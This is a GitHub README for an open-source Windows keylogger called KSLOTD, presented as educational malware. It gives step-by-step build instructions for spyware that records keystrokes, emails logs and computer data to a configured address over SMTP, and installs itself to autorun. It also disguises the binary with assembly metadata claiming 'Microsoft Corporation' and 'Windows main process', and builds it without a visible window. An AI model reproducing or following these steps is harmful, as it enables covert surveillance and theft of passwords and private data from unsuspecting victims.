# KSLOTD
Open Source Key stroke logger for Windows Devices. See [license](https://github.com/Papishushi/KSLOTD/blob/main/LICENSE) for more details.

This piece of .NET software is designed with educative intentions on the field of malware coding mechanisms.This is usefull to the community by, for example: creating algorithims capable of picking this patterns and block the malware before an attack is fullfilled. 

I dont accept any responsibility or liability for the use of this licensed work.

## v1.0 Features:
* Keylogger

* Spyware send emails with log and computer data

* Autoruns setup

* Only displayed on Task Manager


## Usage and Installation:

To use this malware first you have to download the source code compossed of the files:

1. _SysMainProcess.cs_
2. _SysMainProcess.Constants.cs_
3. _SysMainProcess.ico_

Create a new folder for your project and paste those files.

Then modify _SysMainProcess.Constants.cs_ with the required parameters:

`private const ushort SMTP_PORT = Your SMTP port;`  
`private const uint PODCAST_INTERVAL = Interval time in miliseconds at which a podcast is broadcasted;`  
`private static readonly string[] PODCAST_EMISSOR_CREDENTIALS = { "EMISSOR MAIL", "PASSWORD" };`  
`private const string PODCAST_RECEIVER = "RECEIVER MAIL";`  
`private const ushort THREAD_SLEEP_TIME = Time in miliseconds the thread is sleeping;`  
`private const ushort MIN_ASCII_CODE = Minimun ASCII code used;`  
`private const ushort MAX_ASCII_CODE = Maximun ASCII code used;`  
`private const string REGISTRY_FILE_NAME = "YourRegistryFileName.dll";` 

You should also create an _AssemblyInfo.cs_ file within a new folder called Properties in the source code directory with the following code:

    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;

    [assembly: AssemblyTitle("SysMainProcess")]
    [assembly: AssemblyDescription("Windows main process.")]
    [assembly: AssemblyConfiguration("")]
    [assembly: AssemblyCompany("Microsoft Corporation")]
    [assembly: AssemblyProduct("SysMainProcess")]
    [assembly: AssemblyCopyright("Copyright Â©  2021")]
    [assembly: AssemblyTrademark("Microsoft Corporation")]
    [assembly: AssemblyCulture("")]

    [assembly: ComVisible(false)]

    [assembly: AssemblyVersion("1.0.0.0")]
    [assembly: AssemblyFileVersion("1.0.0.0")]
    
And a file labeled _App.config_ in the source code directory specifying the framework version in use:

    <?xml version="1.0" encoding="utf-8"?>
    <configuration>
        <startup> 
            <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0,Profile=Client"/>
        </startup>
    </configuration>

And to finalize compile and build the .NET Framework 4 Client Profile project using some IDE like Visual Studio Community, dont forget to set in the project properties this project as a _Windows Application_ instead of a _Console_, so no GUI appears. Then run the result exe file on your test destination, it should be located in the \bin folder of your project, if the exe file is located among more files you also need all these files.

Congratulations now you own your own copy of this malware!

If you decide to modidy, distribute, fork or use commercially this malware you must declare the source code publicly, and license it under the [GNU General Public License v3.0](https://github.com/Papishushi/KSLOTD/blob/main/LICENSE).  

If you use this tool for nefarius purpose as I said "_I dont accept any responsibility or liability for the use of this licensed work._"

Cheers
